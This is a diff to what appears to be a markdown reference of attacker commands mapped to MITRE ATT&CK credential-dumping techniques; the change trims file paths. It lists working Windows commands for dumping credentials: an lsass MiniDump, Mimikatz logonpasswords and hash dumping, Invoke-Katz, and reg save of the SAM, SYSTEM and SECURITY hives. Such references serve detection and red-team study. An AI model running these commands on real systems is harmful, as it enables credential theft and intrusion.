@@ -157,17 +157,17 @@ rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) 
 OS Credential Dumping: MimiKatz [[T1003.001](https://attack.mitre.org/techniques/T1003/001/)]
 
 ```
-С:\Windows\System32\logfiles\msdol.exe privilege::debug sekurlsa::logonpasswords exit
+msdol.exe privilege::debug sekurlsa::logonpasswords exit
 sekurlsa::Minidump lsassdump.dmp
-C:\Windows\system32\cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\pathtooutfile\*.txt"
-C:\Windows\system32\cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > *.txt
+cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\pathtooutfile\*.txt"
+cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > *.txt
 ```
 <br>
 
 OS Credential Dumping: Security Account Manager [[T1003.002](https://attack.mitre.org/techniques/T1003/002/)]
 
 ```
-С:\Windows\System32\reg.exe save hklm\sam sam.hive
+reg save hklm\sam sam.hive
 reg save hklm\system sys
 reg save hklm\security sec
 ```
